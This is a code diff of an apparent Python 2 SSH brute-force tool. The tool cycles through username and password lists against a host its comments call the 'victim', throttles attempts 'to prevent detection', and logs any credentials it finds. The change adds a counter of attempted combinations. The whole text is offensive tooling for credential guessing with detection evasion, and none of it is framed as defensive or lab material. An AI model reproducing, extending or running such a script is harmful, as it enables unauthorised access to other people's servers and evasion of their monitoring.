@@ -14,7 +14,7 @@
 #############################################################
 #                                                           #
 version = "V0.04"
-build = "006"
+build = "007"
 #############################################################
 
 import pxssh
@@ -55,6 +55,7 @@ def func_scanhost(ip, logloc):
       print txt
       found = False # default : credentials not found yet
       blocked = False # default : not blocked by victim host
+      tried = 0
 	   
       for usr in user: # run through all usernames
          if found == True: # if credentials were found with previous combination -> exit
@@ -66,6 +67,7 @@ def func_scanhost(ip, logloc):
          for pwd in pswd:  # run through all passwords for each username
             print('* Try %s:%s' % (usr, pwd)),
             time.sleep (500.0 / 1000.0) # slow down to prevent detection
+            tried += 1
 	         
             try: # try to connect
                s = pxssh.pxssh()
@@ -87,7 +89,12 @@ def func_scanhost(ip, logloc):
                   func_writelog('a', logloc, txt + '\n')
                   print txt
                   blocked = True
-                  break               	
+                  break  
+      
+      txt = "Tried " + str(tried) + " combinations"
+      func_writelog("a", logloc, txt + "\n")
+      print txt
+                   	
                	
    else: # if SSH-port is closed
       txt = "Port 22 (SSH) is closed."
